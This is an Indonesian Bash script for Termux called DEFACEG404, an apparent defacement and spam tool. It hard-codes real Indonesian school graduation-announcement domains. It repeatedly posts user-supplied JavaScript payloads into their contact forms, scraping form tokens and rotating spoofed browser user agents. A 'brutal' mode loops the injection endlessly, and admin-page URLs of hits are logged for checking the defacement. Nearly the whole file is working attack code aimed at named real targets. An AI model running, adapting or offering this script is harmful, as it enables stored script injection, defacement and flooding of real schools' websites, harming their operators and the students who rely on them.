#!/bin/bash
e="echo -e "
ne="echo -ne "
m="\033[1;31m"     # Merah (Sudah diberikan)
h="\033[1;32m"     # Hijau (Sudah diberikan)
k="\033[1;33m"     # Kuning (Sudah diberikan)
b="\033[1;34m"     # Biru (Sudah diberikan)
bl="\033[1;36m"    # Biru Muda (Sudah diberikan)
p="\033[1;37m"     # Putih (Sudah diberikan)
u="\033[1;35m"     # Ungu
pu="\033[1;30m"    # Abu-abu
c="\033[1;96m"     # Cyan Terang
or="\033[1;91m"    # Merah Muda Terang
g="\033[1;92m"     # Hijau Terang
y="\033[1;93m"     # Kuning Terang
bld="\033[1;94m"   # Biru Terang
pwl="\033[1;95m"   # Ungu Terang
blg="\033[1;97m"   # Putih Terang
lg="\033[1;90m"    # Abu-abu Terang
bg_m="\033[41m"    # Latar Belakang Merah
bg_h="\033[42m"    # Latar Belakang Hijau
bg_k="\033[43m"    # Latar Belakang Kuning
bg_b="\033[44m"    # Latar Belakang Biru
bg_bl="\033[46m"   # Latar Belakang Biru Muda
bg_p="\033[47m"    # Latar Belakang Putih
bg_u="\033[45m"    # Latar Belakang Ungu
bg_pu="\033[40m"   # Latar Belakang Abu-abu
bg_c="\033[106m"   # Latar Belakang Cyan Terang
bg_or="\033[101m"  # Latar Belakang Merah Muda Terang
bg_g="\033[102m"   # Latar Belakang Hijau Terang
bg_y="\033[103m"   # Latar Belakang Kuning Terang
bg_bld="\033[104m" # Latar Belakang Biru Terang
bg_pwl="\033[105m" # Latar Belakang Ungu Terang
bg_lg="\033[100m"  # Latar Belakang Abu-abu Terang
res="\033[0m"
Version="/data/data/com.termux/files/usr/lib/python3.11/email/mime/Dneu/Version"
versitoolsv5=$(cat "$Version")
HASILE_SU_ASU="/storage/emulated/0/HASIL-DEFACEG404.txt"
bluearchive() {
     audioupdate() {
          cd /data/data/com.termux/files/usr/lib/python3.11/email/mime/
          git clone --depth 1 https://github.com/konsol404/audio
          cd /data/data/com.termux/files/usr/lib/python3.11/email/mime/audio
          git pull origin main &> /dev/null
          git stash &> /dev/null
     }
     audioupdate &> /dev/null &
     audio_dir="/data/data/com.termux/files/usr/lib/python3.11/email/mime/audio"
     audio_files=($(ls -1 $audio_dir/*.mp3 | shuf))
     for ((i = 0; i <= 1; i++)); do
          random_audio=${audio_files[$RANDOM % ${#audio_files[@]}]}
          play -q "$random_audio" &> /dev/null
     done
}
loading() {
     while true; do
          echo -ne "DEFACEG404 Sedang Berjalan: "
          for i in {1..20}; do
               echo -ne ">"
               sleep 0.01
          done
          echo -ne "\r\033[K"
     done
}

baner() {
echo "jangan hapus"
}
ctrl_c() {
    echo -ne "\r\r\r[ ! ] Script Berhenti !"
    # Kill semua background jobs (loading & proses lain)
#    jobs -p | xargs -r kill
    kill $LOADING_PID &> /dev/null
    if [ -f "$HASILE_SU_ASU" ]; then
        echo -e "${h}Hasil tersimpan di:${res}"
        echo -e "${b}$HASILE_SU_ASU${res}"
        echo
        read -p "SILAHKAN ENTER"
    else
        echo -e "${m}Hasil belum ada. Pastikan:"
        echo -e "1. Memberikan izin akses penyimpanan"
        echo -e "2. Target website merespon${res}"
        echo
        read -p "SILAHKAN ENTER"
    fi
}
domains=(
"https://lulus.sman1pklkuras.sch.id"
"www.kelulusan.sman1subang.sch.id"
"https://www.sman1ambarawalpg.sch.id/asik"
"https://info.labschoolcibubur.sch.id/osissmp"
"https://sman1puncu.sch.id/pengumuman"
"https://smkn4purworejo.sch.id/lulussmk4"
"https://lulus.smantujuhkabtang.sch.id/"
"https://pengumuman.smanila.sch.id"
"https://kelulusan.smkbinapatria1sukoharjo.sch.id"
"https://nilai.sman6sby.sch.id/"
"https://sman2kalianda.sch.id/kelulusan"
"https://www.kelulusan.mtscieurih.sch.id/"
"https://smknegeri9garut.id/"
"https://pengumuman.man1kuburaya.sch.id"
""
)
paths=(
  "/index.php?page=contact"
  "/index.php?page=kirimpesan"
  "/admin/hubungi.php"
)
urls=()
for domain in "${domains[@]}"; do
  for path in "${paths[@]}"; do
    urls+=("$domain$path")
  done
done
for url in "${urls[@]}"; do
  echo "$url"
done

menu1() {
DEFACE() {
     local nama="$1"
     local email="$2"
     local pesan="$3"
     send_data() {
          local form_url=$1
          local submit_url=$2
          local admin_url=$3
          local user_agents=(
               "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"
               "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240"
               "Mozilla/5.0 (iPad16,3; CPU OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Tropicana_NJ/5.7.1"
"Dalvik/2.1.0 (Linux; U; Android 14; SM-X306B Build/UP1A.231005.007)"
"Dalvik/2.1.0 (Linux; U; Android 14; SM-P619N Build/UP1A.231005.007)"
"Dalvik/2.1.0 (Linux; U; Android 15; 24091RPADG Build/AQ3A.240801.002)"
"Dalvik/2.1.0 (Linux; U; Android 11; KFRASWI Build/RS8332.3115N)"
"Dalvik/2.1.0 (Linux; U; Android 14; SM-P619N Build/UP1A.231005.007)"
"Dalvik/2.1.0 (Linux; U; Android 13; LET02 Build/TKQ1.230127.002)"
"Mozilla/5.0 (iPad15,3; CPU OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Resorts/4.7.5"
"Mozilla/5.0 (Linux; Android 12; SM-X906C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 11; Lenovo YT-J706X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
"Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36"
"Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36"
"Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36"
"Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36"
"Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36"
"Mozilla/5.0 (Linux; Android 4.4.3; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/47.1.79 like Chrome/47.0.2526.80 Safari/537.36"
"Mozilla/5.0 (Linux; Android 5.0.2; LG-V410/V41020c Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1847.118 Safari/537.36"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
"Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3.1 Safari/605.1.15"
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
"Mozilla/5.0 (Linux; Android 9; SM-G960F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 10; SM-N975F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
"Mozilla/5.0 (Linux; Android 8.0.0; Pixel 2 Build/OPD3.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36"
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
"Mozilla/5.0 (Linux; Android 11; SM-G991B Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36"
"Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1"
"Mozilla/5.0 (Linux; Android 9; Redmi Note 8 Pro Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 7.1.1; Nexus 6P Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
"Mozilla/5.0 (Linux; Android 10; SM-A505F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 9; SM-J260G Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
"Mozilla/5.0 (Linux; Android 11; SM-G998B Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36"
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Mobile/15E148 Safari/605.1.15"
"Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 8.1.0; Pixel 2 XL Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15"
          )
local cookies_file="/data/data/com.termux/files/usr/tmp/cookies.txt"
local user_agent="${user_agents[$RANDOM % ${#user_agents[@]}]}"
local response=$(curl -s -c "$cookies_file" -A "$user_agent" "$form_url")
local token=$(echo "$response" | grep -oP '(?<=name="token" value=")[^"]*')
local http_status
if [[ -n "$token" ]]; then
    response=$(curl -s -b "$cookies_file" -X POST "$submit_url" \
        -d "nama=$nama" \
        -d "email=$email" \
        -d "pesan=$pesan" \
        -d "token=$token" \
        -D headers.txt \
        -A "$user_agent")
else
    response=$(curl -s -b "$cookies_file" -X POST "$submit_url" \
        -d "nama=$nama" \
        -d "email=$email" \
        -d "pesan=$pesan" \
        -D headers.txt \
        -A "$user_agent")
fi

          http_status=$(grep "HTTP/" headers.txt | awk '{print $2}')
          local baris_pad=""
          if [[ "$http_status" == "200" ]]; then
               echo "$admin_url" >> $HASILE_SU_ASU
          fi
     }
     for ((i = 0; i < ${#urls[@]}; i += 3)); do
          form_url="${urls[i]}"
          submit_url="${urls[i + 1]}"
          admin_url="${urls[i + 2]}"
          send_data "$form_url" "$submit_url" "$admin_url" &
          sleep 0.1
     done
}
Premfree() {
     clear
     echo "============HASIL DEFACE==========" > $HASILE_SU_ASU
     baner | lolcat
     xdg-open "https://defacer.id/tools/jso-generator"
     read -p "Masukkan Nama Anda: " apa
     read -p "Masukkan Pesan (Jso): " javascript
     clear
     baner | lolcat
     echo
     $e $m $bg_lg "Jika Ingin Berhenti ketik q lalu Enter saja$res"
       loading &
     LOADING_PID=$!
     while true; do
          sleep 0.1
          DEFACE "$apa" "TOOLSV5©2025" "$javascript"
                         if read -t 1 user_input; then
                              if [[ $user_input == "q" ]]; then
                                   ctrl_c
                                   break 5
                              fi
                         fi
     done
}
Premfree
}

menu2() {
DEFACE() {
     local nama="$1"
     local email="$2"
     local pesan="$3"
     send_data() {
          local form_url=$1
          local submit_url=$2
          local admin_url=$3
          local user_agents=(
               "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"
               "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240"
          )
local cookies_file="/data/data/com.termux/files/usr/tmp/cookies.txt"
local user_agent="${user_agents[$RANDOM % ${#user_agents[@]}]}"
local response=$(curl -s -c "$cookies_file" -A "$user_agent" "$form_url")
local token=$(echo "$response" | grep -oP '(?<=name="token" value=")[^"]*')
local http_status
if [[ -n "$token" ]]; then
    response=$(curl -s -b "$cookies_file" -X POST "$submit_url" \
        -d "nama=$nama" \
        -d "email=$email" \
        -d "pesan=$pesan" \
        -d "token=$token" \
        -D headers.txt \
        -A "$user_agent")
else
    response=$(curl -s -b "$cookies_file" -X POST "$submit_url" \
        -d "nama=$nama" \
        -d "email=$email" \
        -d "pesan=$pesan" \
        -D headers.txt \
        -A "$user_agent")
fi

          http_status=$(grep "HTTP/" headers.txt | awk '{print $2}')
          local baris_pad=""
          if [[ "$http_status" == "200" ]]; then
               echo "$admin_url" >> $HASILE_SU_ASU
          fi
     }
     for ((i = 0; i < ${#urls[@]}; i += 3)); do
          form_url="${urls[i]}"
          submit_url="${urls[i + 1]}"
          admin_url="${urls[i + 2]}"
          send_data "$form_url" "$submit_url" "$admin_url" 
          sleep 1
     done
}
Premfree() {
     clear
     baner | lolcat
     echo "============HASIL DEFACE==========" > $HASILE_SU_ASU 
     xdg-open "https://defacer.id/tools/jso-generator/"
     read -p "Masukkan Nama Anda: " apa
     read -p "Masukkan Pesan (Jso): " javascript
     clear
     baner | lolcat
     echo
     sleep 3
#     $e $m $bg_lg "Jika Ingin Berhenti CTRL + C saja$res"
     loading &
     LOADING_PID=$!
          sleep 0.1
          DEFACE "$apa" "TOOLSV5©2025" "$javascript"
     kill $LOADING_PID
    if [ -f "$HASILE_SU_ASU" ]; then
          echo -ne "\r${h}Hasil tersimpan di:${res}\n"
          echo -e "${b}$HASILE_SU_ASU${res}"
          echo
          read -p "SILAHKAN ENTER"
     else
          echo -e "${m}Hasil belum ada. Pastikan:"
          echo -e "1. Memberikan izin akses penyimpanan"
          echo -e "2. Target website merespon${res}"
          echo
          read -p "SILAHKAN ENTER"
     fi
    
}
Premfree
}
show_menu() {
while true; do
clear
    baner | lolcat
    echo
        bluearchive &> /dev/null
    echo -e "     $bg_lg$m[=== Pilih Menu Mode ===]$res"
    echo
    echo -e "$b[$k 1$c.$b ]$h Mode Brutal$p Spam Berulang"
    echo -e "$b[$k 2$c.$b ]$h Menu Sekali$p Spam Satu Putaran"
    echo -e "$b[$k 3$c.$b ]$h Exit$p Back To Menu Toolsv5$k"
    read -p "Pilih menu [1/3]: " pilihan

    case "$pilihan" in
        1) menu1 ;;
        2) menu2 ;;
        3) break 5 ;;
        *) echo "Pilihan tidak valid!"; sleep 3 ;;
    esac
    done
}
while true; do
     complate="$HOME/succesboskuh🗿"
     if [ -f "$complate" ]; then
          clear
          isipesan="Terdeteksi menjalankan DEFACEG404"
          telegram &> /dev/null &
          show_menu
          break
     else
          clear
          echo "Installasi Package Sabar !"
          apt update
          nala install curl wget ruby sox mpv ncurses-utils -y
          gem install lolcat
          touch "$complate"
          clear
          read -p "Kalau Boleh Tau Siapa Nama Anda ? " namamu
          echo "$namamu" > "$siapa"
          clear
          echo "Bantu Subscribe Galirus Official"
          sleep 5
          xdg-open "https://www.youtube.com/@GalirusProjects"
          clear
          echo "TUTORIALNYA DI TIKTOK SINI BREK !"
          sleep 10
          xdg-open "https://vt.tiktok.com/ZSY3Jkq5K/"
     fi
done
